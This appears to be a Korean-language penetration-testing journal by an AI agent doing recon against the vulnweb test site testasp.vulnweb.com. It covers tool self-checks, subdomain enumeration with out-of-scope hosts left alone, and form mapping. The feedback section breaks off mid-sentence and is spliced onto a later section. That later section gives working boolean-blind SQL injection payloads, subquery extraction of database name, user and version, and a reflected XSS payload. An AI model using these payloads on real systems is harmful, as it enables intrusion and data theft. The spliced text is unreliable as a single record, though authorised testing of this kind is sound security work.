## Round 4 — 2026-09-23T07:20:00Z

**라운드 성격**: 체크리스트 자가진단 + recon 0~2단계 착수 라운드. exploit 시도 없음 →

**1. 추론 근거**

사용자가 새 phase 를 시작하며 세 가지 자가진단을 지시했다: (1) cronjob 도구 존재 여부,
(2) browser/vision 으로 페이지를 열고 스크린샷 1장(CDP 연결 수리 후 확인), (3) RAG MCP
`write_journal_round` 호출 성공 여부(별개 버그 수리 후 확인). 자가진단을 끝낸 뒤
`tech-docs/web/general/recon-methodology.md` 의 0~5단계를 순서대로 밟고, 병렬화 가능한
recon 작업은 `delegate_task` 로 위임하라는 지시도 받았다.

도구를 "설치돼 있다"는 자기신고가 아니라 실제 호출로 검증한다는 원칙(이 프로젝트 Round 2
에서 nikto 출력을 재현 검증하지 않았으면 오탐 2건을 보고할 뻔했다)에 따라, 세 자가진단을
전부 실제 실행/프로세스·로그 확인으로 판정하였다.

recon 착수 근거: Round 1~3 에서 이미 자산/기술스택/경로가 상당히 확정돼 있어(iis, asp,
asp.net, tinymce / 34개 고유 위치 / `/_vti_cnf/` 파일 존재 오라클), 이번 라운드는 그것을
재확인하기보다 **아직 안 본 축**에 자원을 배분했다 — (a) passive URL 이력(gau/wayback/crt.sh),
(b) 확장자 세트를 넓힌 재탐색(`.dwt/.css/.js/.ini` 는 미시도), (c) `/_vti_cnf/` 오라클의
완전 열거, (d) 정적 자원(HTML 주석·JS) 분석, (e) nuclei/nikto 교차검증.

**3. 결과**

**(1) cronjob 도구 — 없음(정상).** `tool_search` 매치 0건이고 `config.yaml` 의
`agent.disabled_toolsets` 에 `cronjob` 이 명시적으로 들어 있다(주석까지 있음). 사용자가
"없는 게 정상"이라고 한 것과 일치. **자가진단 1 통과(기대대로 부재).**

**(2) browser/vision — 부분 동작, 원인은 환경의 Chrome 이다.**
- `browser_exec` 자체는 살아 있다: `about:blank` 에서 `js("1+1")=2`, 스크린샷 PNG 반환(육안
  확인: 1280×577 흰 화면 = about:blank 의 정상 렌더), `example.com` 로드 및 스크린샷 성공.
  즉 **CDP 연결은 이제 된다**(이전 "CDP 연결 안 됨" 증상은 재현되지 않음).
- 그러나 **외부 평문 HTTP 사이트는 로드 불가**: `net::ERR_BLOCKED_BY_CLIENT`.
  격리 브라우저 세션(`session="probe"`)에서도, 하네스를 완전히 우회한 원시 chrome 에서도,
  `env -i` 클린 환경에서도, `--proxy-server=direct://` 에서도 동일. 반면 HTTPS 는 정상,
  `127.0.0.1:8080` 로컬 HTTP 도 정상.
- **원인 확정**: `--disable-features=HttpsUpgrades,HttpsFirstModeV2,HttpsFirstBalancedMode`
  를 주면 같은 원시 chrome 이 타겟을 정상 렌더링한다 → Chrome 152.0.7977.8 의
  HTTPS-Upgrade/HTTPS-First 계열 기능이 이 환경에서 HTTP-only 호스트를 차단하고 있다.
- 부수 확인: 이 Chrome 빌드는 `--screenshot=` 플래그로 파일을 만들지 않는다(구식 경로 제거).
  CDP `Page.captureScreenshot` 로 우회해 **실제 타겟 스크린샷 4장**을 확보했다
  (`scratch/pages/shot_{Default,login,register,search}.png`, 66KB/47KB/50KB/16KB,
  title 각각 `acuforum forums` / `acuforum login` / `acuforum register` /
  `500 - Internal server error.`).
- **자가진단 2 판정: browser/vision 스택은 동작하나(스크린샷·JS·vision 확인됨), 이
  환경에서는 HTTP-only 타겟을 브라우저로 열 수 없다.** 타겟이 HTTP 전용(nmap: 443 filtered)
  이라 브라우저 기반 recon 은 현재 불가 → CDP 우회 경로(`scratch/cdp_shot.py`)를 만들어
  대체했고, 이 파일은 재실행 가능한 재현 코드로 남겼다. 하네스 쪽 영구 수정은 브라우저
  실행 시 위 `--disable-features` 를 넘기는 것(또는 `BU_CDP_URL` 로 외부 기동 chrome 에
  붙이기)이다 — 하네스에 chrome 인자 설정 훅이 없음을 소스 grep 으로 확인했다.

**(3) RAG MCP `write_journal_round` — 서버는 정상, Hermes 세션에는 등록되지 않음.**
- `hermes --profile red mcp list` → **"No MCP servers configured."** 즉 `config.yaml` 의
  `mcp.servers.rag` 블록은 Hermes 가 읽는 스키마/위치가 아니다(Hermes 는 MCP 서버를
  `hermes mcp add` 로 관리한다). 그래서 `tool_search` 에도 매치가 없고, `agent.log` 에는
  "Background MCP discovery previously exited with no connected servers" 만 남아 있다.
- 반면 **서버 자체는 완전히 정상**이다: `services/rag_mcp_server/server.py` 를 하네스 venv
  python 으로 stdio 기동해 `initialize` → `serverInfo {"name":"rag","version":"1.30.0"}`,
  `tools/list` → `search, write_journal_round, write_generalized_knowledge, write_report,
  update_report_score` 를 확인했다. 즉 "방금 고친 버그"는 **서버 측은 해결됐고**, 남은
  문제는 **Hermes 프로필에 MCP 서버가 등록되지 않은 것**이다(별개 원인).
- **자가진단 3 판정: 도구 호출은 세션에서 불가(미등록).** 단 서버 경로는 정상이므로,
  이번 라운드 미러링은 **동일 서버를 stdio 로 직접 호출해** 수행했다(아래 부기).

**(4) recon 1단계(passive) — 스코프 밖 자산 다수 확인.**
`subfinder -d vulnweb.com` 결과 14개 이름:
`testasp.vulnweb.com`(in-scope), `virus`, `www.virus`, `www`, `odincovo`, `rest`,
`testaspnet`, `testhtml5`, `testphp`, `viruswall`, `www.test.php`, `antivirus1`, `estphp`,
`tetphp`. **in-scope 는 `testasp.vulnweb.com` 하나뿐이며 나머지는 전부 스코프 밖이므로
요청을 보내지 않았다.** crt.sh 는 직접 조회가 실패(JSON 파싱 실패) → 자식에게 위임.

**(5) recon 2단계(살아있는 호스트/기술스택) — 확정.**
- `nmap -Pn -sV`: **80/tcp open (Microsoft IIS httpd 8.5)**, 443/8080/8443/21/22/25/3389
  **전부 filtered**. rDNS `ec2-44-238-29-244.us-west-2.compute.amazonaws.com`,
  OS Windows. → **HTTPS 미제공**이 확인됐고, 이것이 (2)의 브라우저 문제와 맞물린다.
- `httpx -tech-detect`: `[200] [acuforum forums] [Microsoft-IIS/8.5]
  [DreamWeaver,IIS:8.5,Microsoft ASP.NET,Windows Server]`. **DreamWeaver 가 새 신호**다 —
  HTML 소스의 `<!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" ... -->`
  주석과 일치한다(정적 기술 2개 이상 일치 조건 충족).
- `whatweb` 은 **도구 자체가 깨져 있다**: `/usr/bin/whatweb:257:in 'require_relative':
  cannot load such file -- /usr/bin/lib/messages (LoadError)`. 패키징 문제로 판단,
  이 도구는 이번 프로젝트에서 사용 불가로 기록.

**(6) recon 0단계(실사용자 플로우) — 브라우저 대신 curl+CDP 로 수행.**
- 폼/필드 확정: `login.asp` `POST`(action="") — `tfUName`, `tfUPass`;
  `register.asp` `POST` name=`frmRegister` — `tfUName`, `tfRName`, `tfEmail`, `tfUPass`;
  `search.asp` `GET` name=`frmSearch` — `tfSearch`. **hidden 필드는 하나도 없다.**
- mitmproxy 캡처 정상 동작 확인: 프록시 경유 요청 4건 후 `.phase-runtime/current/capture.jsonl`
  5줄 생성(method/url 확인). `.phase-runtime/current/` 에 `_waf_status_log.jsonl` 도 생성됨.

**(7) ★ 최우선 발견 — `/search.asp?tfSearch=<값>` 이 500 을 반환한다.**

| 요청 | 코드 | 크기 |
|---|---|---|
| `/search.asp` (파라미터 없음) | 200 | 2809 |
| `/search.asp?tfSearch=test` | **500** | 1208 |
| `/search.asp?tfSearch=1` | **500** | 1208 |
| `/search.asp?tfSearch=a` | **500** | 1208 |
| `/search.asp?tfSearch=test%20post` | **500** | 1208 |
| `/search.asp?tfSearch=%27` (작은따옴표) | **200** | **2963** |

- 알파벳/숫자 검색어는 전부 500(IIS 기본 `500 - Internal server error.` 페이지만, 스택트레이스
  없음), **작은따옴표 단독 입력만 200 + 본문이 154B 커진다**. 입력값에 따라 서버 동작이
  질적으로 갈리는 것은 SQL 문자열 조립 지점의 강한 신호다.
- 주의: 이번 라운드는 **동작 관찰만** 했고 인젝션 페이로드는 보내지 않았다(에러 유발 여부와
  응답 크기 차이만 기록). 다음 라운드의 exploit 후보 1순위로 등록한다.

**4. 피드백**

- 자가진단 3건 모두 **도구 자기신고가 아니라 실제 실행 증거로 판정**했다. 결과는
  "1 통과(부재 확인) / 2 부분통과(스택은 살아 있으나 HTTP-only 타겟 불가, 원인·우회 확보) /
  3 실패(세션 미등록) — 단 서버는 정상".
- 두 건에서 **증상을 겉으로만 고치면 오진했을 함정**이 있었다:
  (a) 브라우저 실패를 하네스/데몬 문제로 보면 틀린다 — 원시 chrome + `env -i` 에서도
  재현되고 `--disable-features` 로 해소되므로 원인은 **Chrome 152 의 HTTPS-Upgrade 기능**이다.
  (b) RAG 도구 부재를 서버 버그로 보면 틀린다 — stdio 핸드셰이크로 서버가 완전 정상임을

**(2) `search.asp?tfSearch=` — SQLi boolean-blind 실증 성공.**

1차 페이로드는 **실패**했다(모두 500). 원인을 규명했다: 원본 쿼리는
`AND (CHARINDEX(a.title, '<st>')>0 OR CHARINDEX(a.message, '<st>')>0)` 인데, 내 페이로드
`zzq') OR (1=1) OR (''='` 는 `>0` 없이 `(1=1)` 을 남겨 `(boolean)>0` 이 되어 T-SQL 이
"non-boolean type" 오류를 냈다. **`>0` 을 유지하고 괄호를 `))--` 로 닫는 형태**로 교정했다:

| 페이로드 | 결과 | 판정 |
|---|---|---|
| `tfSearch=test` (대조) | 200 2964B, 0행 | 기준 |
| `zzq')>0 OR (1=1))--` | **200 7699B, 7행** | TRUE |
| `zzq')>0 OR (1=2))--` | **200 3081B, 0행** | FALSE |
| `zzq')>0 OR (2>1))--` / `(2<1)` | 7699 / 3081 | TRUE/FALSE 재현 |
| `zzq')>0 OR ('a'='a'))--` / `('a'='b')` | 7743 / 3125 | TRUE/FALSE 재현 (독립 쌍) |

서브쿼리 오라클로 뽑아낸 사실(모두 TRUE 로 7행): `DB_NAME()='acuforum'`,
`SYSTEM_USER='acunetix'`, `@@VERSION LIKE '%SQL Server%'`(→ **MSSQL 확정**, 노출된
연결문자열의 `SQLNCLI11` 과 일치), `COUNT(*)>0`(posts, users).

소스 근거(=`item=Search.asp` 로 확보): `st = Request.QueryString("tfSearch")` 를 **이스케이프
없이** 그대로 문자열 결합하며, `Response.Write("<div class='path'>You searched for '" &
Request.QueryString("tfSearch") & "'</div>")` 로 **무이스케이프 반사**한다. 전자는 SQLi,
후자는 반사 XSS(비인증 GET)다 — `tfSearch=<script>alert(1)</script>` 가 본문에
`You searched for '<script>alert(1)</script>'` 로 **원문 그대로** 들어가는 것을 확인했다.

부정 결과: UNION(`zzq') UNION SELECT 1..10--`) → 500(문맥 불일치), 시간기반
(`))--; WAITFOR DELAY '0:0:4'--`) → elapsed 0.33s(대조 0.36s)로 **지연 없음** → 스택드 쿼리
미실행. 즉 이 엔드포인트에서 추출 가능한 경로는 **boolean-blind / 서브쿼리 오라클 단독**이다.

부수 확인: `CHARINDEX(a.title, '<입력>')` 는 인자 순서가 뒤집혀 있어 **역방향 검색**이다(게시글
제목이 검색어의 부분문자열인지를 봄). 그래서 `<script>alert(1)</script>` 를 넣으면 제목 `1` 인
게시글이 매칭돼 2행이 나온다 — 처음엔 이 때문에 오독할 뻔했고, 그 덕에 `rows` 개수 기반 오라클과
반사 여부를 분리해 판정할 수 있었다.
